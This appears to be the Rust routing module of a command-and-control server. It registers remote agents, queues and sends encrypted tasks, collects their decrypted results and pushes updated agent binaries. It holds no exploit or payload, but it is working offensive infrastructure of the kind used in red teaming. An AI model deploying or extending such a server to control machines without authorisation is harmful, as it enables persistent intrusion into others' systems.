use axum::{
    extract::{Path, State},
    http::StatusCode,
    response::IntoResponse,
    routing::{get, post, put},
    Json, Router,
};
use common::{crypto, model};
use tracing::{debug, error, warn};

use crate::{services, C2State};

// TODO Fix logs
// TODO Fix error system
// TODO Either encrypt all routes or listen on a different interface for admin routes

pub fn init_router() -> Router<C2State> {
    Router::new()
        .route("/crypto/:mission_id", get(get_crypto))
        .nest(
            "/agents",
            Router::new().route("/", get(agents::get)).nest(
                "/:agent_id",
                Router::new()
                    .route("/update", put(agents::update_bin))
                    .route("/name/:agent_name", put(agents::update_name)),
            ),
        )
        .nest(
            "/missions",
            Router::new()
                .route("/", post(missions::create).get(missions::get_next))
                .route(
                    "/:mission_id",
                    get(missions::get_report).put(missions::report),
                ),
        )
}

const AGENT_NOT_FOUND: &str = "Agent not found.";
const MISSION_NOT_FOUND: &str = "Mission not found.";

async fn get_crypto(
    State(mut c2_state): State<C2State>,
    Path(mission_id): Path<i32>,
    crypto_negociation: Json<model::CryptoNegociation>,
) -> impl IntoResponse {
    // Check agent & agent exists
    let agent = match crypto_negociation.verify() {
        Ok(_) => {
            match services::agents::get_by_identity(
                c2_state.conn.clone(),
                crypto_negociation.identity.to_bytes(),
            ) {
                Some(agent) => agent,
                None => {
                    warn!("Agent not found");
                    return (StatusCode::NOT_FOUND, AGENT_NOT_FOUND).into_response();
                }
            }
        }
        Err(e) => {
            error!("{e}");
            return (StatusCode::UNAUTHORIZED).into_response();
        }
    };

    // Check mission exists
    let mission = match services::missions::get_by_id(c2_state.conn.clone(), mission_id) {
        Ok(Some(m)) => m,
        Ok(None) => {
            warn!("Mission not found");
            return (StatusCode::NOT_FOUND, MISSION_NOT_FOUND).into_response();
        }
        Err(e) => {
            error!("{e}");
            return (StatusCode::INTERNAL_SERVER_ERROR).into_response();
        }
    };

    // Check mission is not completed and is for the agent
    if mission.completed_at.is_some() || mission.agent_id != agent.id {
        warn!(
            "Mission [{}] is completed or not affected to agent [{}]",
            mission_id, agent.id
        );
        return (StatusCode::BAD_REQUEST).into_response();
    }

    let (private_key, crypto_negociation) =
        model::CryptoNegociation::new(&mut c2_state.signing_key);
    c2_state
        .ephemeral_private_keys
        .lock()
        .unwrap()
        .entry(mission.id)
        .or_insert(private_key);

    (StatusCode::OK, Json(Some(crypto_negociation))).into_response()
}

mod agents {
    use axum::{body::Bytes, extract::Path};
    use tracing::error;

    use super::*;

    pub async fn get(State(c2_state): State<C2State>) -> impl IntoResponse {
        if let Ok(agents) = services::agents::get(c2_state.conn.clone()) {
            (StatusCode::OK, Json(agents)).into_response()
        } else {
            (StatusCode::INTERNAL_SERVER_ERROR).into_response()
        }
    }

    // #[axum::debug_handler]
    pub async fn update_bin(
        State(c2_state): State<C2State>,
        Path(agent_id): Path<i32>,
        _bin: Bytes,
    ) -> impl IntoResponse {
        if services::agents::get_by_id(c2_state.conn.clone(), agent_id).is_none() {
            return (StatusCode::NOT_FOUND).into_response();
        };
        if let Err(e) =
            services::missions::create(c2_state.conn.clone(), agent_id, model::Task::Update(vec![]))
        {
            error!("{e}");
            return (StatusCode::INTERNAL_SERVER_ERROR).into_response();
        }
        (StatusCode::OK).into_response()
    }

    pub async fn update_name(
        State(c2_state): State<C2State>,
        Path((agent_id, agent_name)): Path<(i32, String)>,
    ) -> impl IntoResponse {
        let Ok(agent) =
            services::agents::update_name_by_id(c2_state.conn.clone(), agent_id, &agent_name)
        else {
            return (StatusCode::NOT_FOUND, AGENT_NOT_FOUND).into_response();
        };
        (StatusCode::OK, Json(Some(agent))).into_response()
    }
}

mod missions {
    use std::str::FromStr;

    use axum::{extract::Path, http::HeaderMap};
    use common::{model::Mission, PLATFORM_HEADER};
    use tracing::error;

    use super::*;

    pub async fn create(State(c2_state): State<C2State>, body: Json<Mission>) -> impl IntoResponse {
        debug!("{body:#?}");
        if let Ok(mission) =
            services::missions::create(c2_state.conn.clone(), body.agent_id, body.task.clone())
        {
            (StatusCode::CREATED, Json(mission)).into_response()
        } else {
            (StatusCode::INTERNAL_SERVER_ERROR).into_response()
        }
    }

    pub async fn get_next(
        State(mut c2_state): State<C2State>,
        headers: HeaderMap,
        crypto_negociation: Json<model::CryptoNegociation>,
    ) -> impl IntoResponse {
        if let Err(e) = crypto_negociation.verify() {
            error!("{e}");
            return (StatusCode::UNAUTHORIZED).into_response();
        }

        let agent = if let Some(agent) = services::agents::get_by_identity(
            c2_state.conn.clone(),
            crypto_negociation.identity.to_bytes(),
        ) {
            agent
        } else {
            match services::agents::create(
                c2_state.conn.clone(),
                "Unnamed agent",
                crypto_negociation.identity.to_bytes(),
                headers
                    .get(PLATFORM_HEADER)
                    .and_then(|p| model::Platform::from_str(p.to_str().unwrap()).ok())
                    .unwrap_or(model::Platform::Unix),
            ) {
                Ok(agent) => agent,
                Err(e) => {
                    error!("{e}");
                    return (StatusCode::INTERNAL_SERVER_ERROR).into_response();
                }
            }
        };

        let Some(mission) = services::missions::poll_next(c2_state.conn.clone(), agent.id).await
        else {
            debug!("No mission for agent {}", agent.id);
            return (StatusCode::NO_CONTENT).into_response();
        };

        // TODO Fix that
        let mission = if let model::Mission {
            task: model::Task::Update(_),
            ..
        } = mission
        {
            // let agent_bin =
            //     std::fs::read("target/x86_64-pc-windows-gnu/release/agent.exe").unwrap();
            let agent_bin = std::fs::read("target/release/agent").unwrap();
            model::Mission {
                task: model::Task::Update(agent_bin),
                ..mission
            }
        } else {
            mission
        };
        //
        debug!("{mission}");
        let mission = serde_json::to_vec(&mission).unwrap();

        (
            StatusCode::OK,
            Json(Some(
                model::CryptoMessage::new(
                    &mut c2_state.signing_key,
                    crypto_negociation.public_key,
                    &mission,
                )
                .unwrap(),
            )),
        )
            .into_response()
    }

    pub async fn get_report(
        State(c2_state): State<C2State>,
        Path(mission_id): Path<i32>,
    ) -> impl IntoResponse {
        let mission = match services::missions::get_by_id(c2_state.conn.clone(), mission_id) {
            Ok(Some(m)) => m,
            Ok(None) => {
                return (StatusCode::NOT_FOUND, MISSION_NOT_FOUND).into_response();
            }
            Err(e) => {
                error!("{e}");
                return (StatusCode::INTERNAL_SERVER_ERROR).into_response();
            }
        };

        if mission.completed_at.is_some() {
            (StatusCode::OK, Json(mission.result)).into_response()
        } else {
            (StatusCode::NO_CONTENT).into_response()
        }
    }

    pub async fn report(
        State(c2_state): State<C2State>,
        Path(mission_id): Path<i32>,
        crypto_message: Json<model::CryptoMessage>,
    ) -> impl IntoResponse {
        let mission = match services::missions::get_by_id(c2_state.conn.clone(), mission_id) {
            Ok(Some(m)) => m,
            Ok(None) => {
                return (StatusCode::NOT_FOUND, MISSION_NOT_FOUND).into_response();
            }
            Err(e) => {
                error!("{e}");
                return (StatusCode::INTERNAL_SERVER_ERROR).into_response();
            }
        };

        let Some(agent) = services::agents::get_by_id(c2_state.conn.clone(), mission.agent_id)
        else {
            return (StatusCode::NOT_FOUND, AGENT_NOT_FOUND).into_response();
        };

        if let Err(e) =
            crypto_message.verify(&crypto::VerifyingKey::from_bytes(&agent.identity).unwrap())
        {
            error!("{e}");
            return (StatusCode::UNAUTHORIZED).into_response();
        }

        let Some(private_key) = c2_state
            .ephemeral_private_keys
            .lock()
            .unwrap()
            .remove(&mission_id)
        else {
            warn!("No ephemeral private key for mission {}", mission_id);
            return (StatusCode::UNAUTHORIZED).into_response();
        };
        let decrypted_data = crypto_message.decrypt(private_key).unwrap();

        let result = String::from_utf8(decrypted_data).unwrap();
        services::missions::complete(c2_state.conn.clone(), mission_id, &result).unwrap();

        (StatusCode::ACCEPTED).into_response()
    }
}
